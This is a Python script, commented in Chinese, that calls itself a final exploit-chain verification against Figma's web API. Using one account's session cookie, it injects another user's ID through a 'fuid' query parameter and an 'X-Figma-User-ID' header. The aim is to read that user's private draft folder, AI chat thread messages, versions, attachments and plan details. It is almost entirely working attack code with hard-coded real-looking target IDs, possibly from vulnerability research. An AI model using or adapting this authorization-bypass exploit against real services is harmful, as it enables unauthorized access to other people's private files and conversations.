# -*- coding: utf-8 -*-
"""最终利用链验证:
1. B+fuid=A 访问 A 的草稿文件夹(634606970) → 枚举 A 所有文件
2. A 私有 design 线程 ee5997d9 的消息内容
3. 尝试遍历 A 的文件列表
"""
import io, json, sys, urllib.error, urllib.parse, urllib.request
sys.stdout.reconfigure(encoding='utf-8', errors='replace')

BASE = "https://www.figma.com"
A_UID = "1666382703778278399"
B_UID = "1667396392129259941"
A_MAKE = "5zb5YkoxMa09KpqOyuLcHD"
A_DESIGN = "5Gs4PaTz11Hlk2sqVnidBG"
A_THREAD_DESIGN = "ee5997d9-bbdb-4912-9587-9022c14c0be0"
PLAN_A = "cc6b6125-a07f-4d39-a54c-50ef65f33919"
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/151.0.0.0 Safari/537.36"


def load(path):
    return io.open(path, encoding='utf-8').read().strip().replace('\n', '; ')


BC = load('ws_cookie_B_new.txt')


def call(label, path, query=None, uid_hdr=None, method="GET"):
    headers = {"User-Agent": UA, "Accept": "application/json", "Origin": BASE,
               "Referer": BASE + "/", "Cookie": BC}
    if uid_hdr:
        headers["X-Figma-User-ID"] = uid_hdr
    url = BASE + path
    if query:
        url += "?" + urllib.parse.urlencode(query)
    req = urllib.request.Request(url, method=method, headers=headers)
    try:
        with urllib.request.urlopen(req, timeout=25) as r:
            raw = r.read().decode(errors='replace')
            print(f"[{label}] HTTP {r.status} {raw[:900]}")
            return r.status, raw
    except urllib.error.HTTPError as e:
        raw = e.read().decode(errors='replace')
        print(f"[{label}] HTTP {e.code} {raw[:250]}")
        return e.code, raw


print("======== 1. A 草稿文件夹内容(注入) ========")
call("B+fuid=A folders/634606970", "/api/folders/634606970", query={"fuid": A_UID})
call("B+X-UID=A folders/634606970", "/api/folders/634606970", uid_hdr=A_UID)

print("\n======== 2. A 私有 design 线程消息 ========")
call("B+fuid=A design messages", f"/api/ai_chat/messages/{A_THREAD_DESIGN}",
     query={"owner_id": A_DESIGN, "owner_type": "file", "fuid": A_UID})

print("\n======== 3. A 私有 design make_versions ========")
call("B+fuid=A design make_versions", f"/api/ai_chat/{A_DESIGN}/make_versions/{A_THREAD_DESIGN}",
     query={"fuid": A_UID})

print("\n======== 4. A 私有 design attachments ========")
call("B+fuid=A design attachments", f"/api/ai_chat/threads/{A_THREAD_DESIGN}/attachments",
     query={"owner_id": A_DESIGN, "owner_type": "file", "fuid": A_UID})

print("\n======== 5. plan 详情注入 ========")
call("B+fuid=A plan", f"/api/plans/{PLAN_A}", query={"fuid": A_UID})
